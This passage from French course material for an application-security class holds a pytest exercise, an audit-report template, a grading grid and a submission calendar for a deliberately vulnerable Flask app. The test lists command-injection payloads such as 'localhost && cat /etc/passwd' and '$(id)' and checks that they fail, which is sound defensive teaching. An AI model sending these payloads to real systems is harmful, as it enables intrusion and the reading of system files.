        # ─── À COMPLÉTER ───────────────────────────────────────
        cmd_payloads = [
            'localhost; id',
            'localhost && cat /etc/passwd',
            '$(id)',
            '`id`',
            'localhost | whoami',
        ]
        for payload in cmd_payloads:
            response = alice_client.post('/ping', data={
                'host': payload,
                'csrf_token': ...  # À compléter
            })
            data = response.get_data(as_text=True)
            # La sortie de la commande 'id' ne doit pas apparaître
            assert 'uid=' not in data, \
                f"Command injection réussie avec : {payload}"
        # ───────────────────────────────────────────────────────
```

---

### 📋 PARTIE C — Rapport d'audit *(20 pts)*

```markdown
# Template rapport_audit.md

# Rapport d'Audit de Sécurité — VulnPyApp
**Auditeurs :** Prénom NOM 1 / Prénom NOM 2
**Date :** JJ/MM/AAAA
**Version auditée :** student-starter (branche Git : student-starter)
**Méthode :** OWASP Testing Guide v4.2

---

## 1. Résumé exécutif

### 1.1 Périmètre
Application Flask de démonstration, déployée localement via Docker.
URL : http://localhost:5000

### 1.2 Résultats en bref

| Sévérité | Nombre | Exemples |
|----------|--------|---------|
| Critique | X      |         |
| Élevée   | X      |         |
| Moyenne  | X      |         |
| Faible   | X      |         |
| Info     | X      |         |

### 1.3 Score de risque global
[Justification en 3-5 lignes]

---

## 2. Vulnérabilités identifiées

### VULN-001 — [Nom] — [Sévérité]

| Champ | Valeur |
|-------|--------|
| ID | VULN-001 |
| Titre | |
| CWE | CWE-XXX |
| CVSS v3.1 | X.X (Vecteur : ...) |
| Fichier | app.py:XX |
| Découverte par | Revue manuelle / Bandit / Test |

**Description :**
[Explication technique de la vulnérabilité]

**Preuve de concept :**
```
[Payload ou commande démontrant la vulnérabilité]
```

**Impact :**
[Ce qu'un attaquant peut faire]

**Recommandation :**
[Code ou configuration corrigée]

---

## 3. Résultats Bandit

[Copier-coller le résumé + analyse des faux positifs/négatifs]

## 4. Résultats Safety / pip-audit

[CVE identifiées dans les dépendances + plan de mise à jour]

## 5. Résultats pytest

```
Résultats branche vulnérable :
  FAILED tests/ ... XX tests
  PASSED tests/ ...  X tests

Résultats branche remediated :
  PASSED tests/ ... XX tests
```

## 6. Recommandations priorisées

| Priorité | Action | Effort | Impact |
|----------|--------|--------|--------|
| P1 | | Faible/Moyen/Élevé | Critique |
| P2 | | | |
...

## 7. Conclusion

[Évaluation globale du niveau de sécurité + points positifs]
```

---

### ⚖️ Grille d'évaluation — Exercice 2B

```
┌────────────────────────────────────────────────────────────────────┐
│                       GRILLE D'ÉVALUATION                          │
│                Audit & Tests de Sécurité — Séance 2                │
├──────────────────────────────────────┬────────┬────────────────────┤
│ Critère                              │ Points │ Barème détaillé    │
├──────────────────────────────────────┼────────┼────────────────────┤
│ PARTIE A — Audit outillé             │ /40    │                    │
│  A1 - Rapport Bandit complet         │ /10    │ Stats + analyse FP │
│  A2 - Rapport Safety/pip-audit       │ /10    │ CVE + fix proposé  │
│  A3 - Checklist OWASP Top 10         │ /20    │ 2pt par catégorie  │
├──────────────────────────────────────┼────────┼────────────────────┤
│ PARTIE B — Tests pytest              │ /40    │                    │
│  Section 1 - SQLi (5 tests)          │ /10    │ 2pt par test       │
│  Section 2 - XSS (5 tests)           │ /10    │ 2pt par test       │
│  Section 3 - Auth (4 tests)          │ /10    │ 2.5pt par test     │
│  Section 4 - Access Control (4 tests)│ /10    │ 2.5pt par test     │
├──────────────────────────────────────┼────────┼────────────────────┤
│ PARTIE C — Rapport d'audit           │ /20    │                    │
│  Structure et clarté                 │ /5     │                    │
│  Qualité technique des analyses      │ /10    │                    │
│  Recommandations pertinentes         │ /5     │                    │
├──────────────────────────────────────┼────────┼────────────────────┤
│ BONUS                                │        │                    │
│  Section 5 - Tests avancés (3 tests) │ +10    │                    │
│  Pipeline CI/CD intégré              │ +5     │                    │
│  Rapport au format PDF professionnel │ +3     │                    │
├──────────────────────────────────────┼────────┼────────────────────┤
│ TOTAL                                │ /100   │                    │
└──────────────────────────────────────┴────────┴────────────────────┘

Pénalités :
  - Tests copiés/identiques sans adaptation   : -20 pts
  - Rapport < 2 pages                         : -10 pts
  - Dépôt Git absent ou non accessible        : -15 pts
  - Retard (>24h)                             : -10 pts/jour
```

---

## 📅 Récapitulatif des rendus

```
┌───────────────────────────────────────────────────────────────────┐
│                    CALENDRIER DES RENDUS                          │
├─────────────┬──────────────────────────┬────────────┬────────────┤
│ Exercice    │ Description              │ Deadline   │ Poids      │
├─────────────┼──────────────────────────┼────────────┼────────────┤
│ 1.A         │ Lab guidé (en séance)    │ Séance 1   │ -          │
│ 1.B         │ CTF SQLi & XSS           │ S1 + 7j    │ 20%        │
│ 1.C         │ Quiz fondamentaux (QCM)  │ Fin séance │ 10%        │
│ 2A          │ Revue de code (en séance)│ Séance 2   │ 15%        │
│ 2B          │ Audit + pytest           │ S2 + 7j    │ 25%        │
│ 3 (projet)  │ Sécurisation app Django  │ S3 + 14j   │ 30%        │
├─────────────┼──────────────────────────┼────────────┼────────────┤
│ TOTAL       │                          │            │ 100%       │
└─────────────┴──────────────────────────┴────────────┴────────────┘

Format de rendu : Archive ZIP nommée <NOM1>_<NOM2>_<exercice>.zip
Plateforme     : Moodle (lien fourni par l'enseignant)
Contact        : securite@institution.fr
```